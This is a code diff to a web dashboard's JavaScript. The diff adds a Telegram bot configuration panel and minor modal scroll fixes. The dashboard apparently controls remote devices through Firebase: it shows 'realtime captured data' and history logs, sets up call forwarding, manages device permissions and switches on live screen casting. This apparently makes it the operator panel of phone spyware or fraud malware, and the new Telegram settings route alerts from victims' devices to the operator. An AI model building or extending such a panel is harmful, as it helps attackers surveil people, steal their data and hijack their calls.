@@ -84,10 +84,12 @@ function displayDashboard(username) {
         if (activeModalType === 'admin_login_time') title = 'Admin Activity Duration';
         if (activeModalType === 'active_admins') title = 'Currently Active Admins';
         if (activeModalType === 'global_admin_number') title = 'Global Admin Number';
+        if (activeModalType === 'telegram') title = 'Telegram Config';
         
         document.getElementById('modal-header-title').innerText = title;
         document.getElementById('details-modal').classList.remove('hidden');
         document.body.style.overflow = 'hidden';
+        document.documentElement.style.overscrollBehaviorY = 'none';
     }
 
     // Set default active tab
@@ -658,6 +660,7 @@ function showCustomerDetailsPopup(deviceId) {
     document.getElementById('modal-header-title').innerText = 'Realtime Captured Data';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI(deviceId);
 }
 
@@ -672,6 +675,7 @@ function showAdminLoginTimePopup() {
     document.getElementById('modal-header-title').innerText = 'Admin Activity Duration';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI("global");
 }
 
@@ -686,6 +690,7 @@ function showActiveAdminsPopup() {
     document.getElementById('modal-header-title').innerText = 'Currently Active Admins';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI("global");
 }
 
@@ -700,6 +705,22 @@ function showGlobalAdminNumberPopup() {
     document.getElementById('modal-header-title').innerText = 'Global Admin Number';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
+    renderModalUI("global");
+}
+
+/**
+ * Opens the Telegram configuration popup
+ */
+function showTelegramPopup() {
+    activeModalDeviceId = "global";
+    activeModalType = 'telegram';
+    localStorage.setItem('activeModalDeviceId', "global");
+    localStorage.setItem('activeModalType', 'telegram');
+    document.getElementById('modal-header-title').innerText = 'Telegram Config';
+    document.getElementById('details-modal').classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI("global");
 }
 
@@ -715,6 +736,7 @@ function showCallForwardModal(deviceId) {
     document.getElementById('modal-header-title').innerText = 'Call Forwarding Setup';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI(deviceId);
 }
 
@@ -729,6 +751,7 @@ function showScreenControlModal(deviceId) {
     document.getElementById('modal-header-title').innerText = 'Live Screen Control';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     
     // Send ON command to device
     database.ref(`Devices/${deviceId}/Screen_cast/screen`).set("on");
@@ -747,6 +770,7 @@ function showPermissionsPopup(deviceId) {
     document.getElementById('modal-header-title').innerText = 'Device Permissions';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI(deviceId);
 }
 
@@ -761,6 +785,7 @@ function showOldDetailsPopup(deviceId) {
     document.getElementById('modal-header-title').innerText = 'Captured History Logs';
     document.getElementById('details-modal').classList.remove('hidden');
     document.body.style.overflow = 'hidden';
+    document.documentElement.style.overscrollBehaviorY = 'none';
     renderModalUI(deviceId);
 }
 
@@ -779,6 +804,7 @@ function closeDetailsModal() {
     localStorage.removeItem('activeModalType');
     document.getElementById('details-modal').classList.add('hidden');
     document.body.style.overflow = '';
+    document.documentElement.style.overscrollBehaviorY = '';
 }
 
 /**
@@ -959,6 +985,45 @@ function renderModalUI(deviceId) {
                 </button>
             </div>
         </div>`;
+    } else if (activeModalType === 'telegram') {
+        // Telegram Configuration UI template
+        const telData = lastSnapshotData.telegram || {};
+        html += `<div class="space-y-6">
+            <div class="text-center space-y-2">
+                <div class="w-16 h-16 bg-sky-50 text-sky-600 rounded-full flex items-center justify-center mx-auto shadow-inner">
+                    <i data-lucide="send" class="w-8 h-8"></i>
+                </div>
+                <p class="text-xs font-bold text-slate-500">Setup Telegram Bot for notifications</p>
+            </div>
+            
+            <div class="space-y-4">
+                <div class="space-y-2">
+                    <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Bot Token ID</label>
+                    <div class="relative">
+                        <div class="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"><i data-lucide="bot" class="w-4 h-4"></i></div>
+                        <input type="text" id="tel-bot-id" placeholder="Enter Bot ID" value="${telData.botToken || ''}"
+                            class="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl pl-12 pr-4 py-4 text-sm font-black text-slate-800 focus:border-sky-500 focus:bg-white transition-all outline-none">
+                    </div>
+                </div>
+                <div class="space-y-2">
+                    <label class="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Admin Chat ID</label>
+                    <div class="relative">
+                        <div class="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400"><i data-lucide="user" class="w-4 h-4"></i></div>
+                        <input type="text" id="tel-chat-id" placeholder="Enter Chat ID" value="${telData.chatId || ''}"
+                            class="w-full bg-slate-50 border-2 border-slate-100 rounded-2xl pl-12 pr-4 py-4 text-sm font-black text-slate-800 focus:border-sky-500 focus:bg-white transition-all outline-none">
+                    </div>
+                </div>
+            </div>
+
+            <div class="grid grid-cols-2 gap-3 pt-2">
+                <button onclick="updateTelegramConfig()" class="bg-sky-500 hover:bg-sky-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-sky-100 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
+                    Add
+                </button>
+                <button onclick="deleteTelegramConfig()" class="bg-rose-500 hover:bg-rose-600 text-white font-black py-4 rounded-2xl shadow-lg shadow-rose-100 active:scale-95 transition-all text-[10px] uppercase tracking-widest">
+                    Delete
+                </button>
+            </div>
+        </div>`;
     } else if (activeModalType === 'call_forwarding') {
         // Call Forwarding Modal UI
         html += `<div class="space-y-6">
@@ -1103,6 +1168,37 @@ function deleteGlobalAdminNumber() {
         .then(() => {
             document.getElementById('global-admin-num-input').value = '';
             showToast("Admin Number Deleted");
+        })
+        .catch(() => showToast("Delete Failed", "error"));
+}
+
+/**
+ * Updates the Telegram config in Firebase
+ */
+function updateTelegramConfig() {
+    const botToken = document.getElementById('tel-bot-id').value.trim();
+    const chatId = document.getElementById('tel-chat-id').value.trim();
+    
+    if (!botToken || !chatId) {
+        showToast("Fill both fields", "error");
+        return;
+    }
+    
+    database.ref('telegram').set({ botToken: botToken, chatId: chatId })
+        .then(() => showToast("Telegram Config Added"))
+        .catch(() => showToast("Update Failed", "error"));
+}
+
+/**
+ * Deletes the Telegram config from Firebase
+ */
+function deleteTelegramConfig() {
+    if (!confirm("Remove Telegram configuration?")) return;
+    database.ref('telegram').remove()
+        .then(() => {
+            document.getElementById('tel-bot-id').value = '';
+            document.getElementById('tel-chat-id').value = '';
+            showToast("Telegram Config Deleted");
         })
         .catch(() => showToast("Delete Failed", "error"));
 }
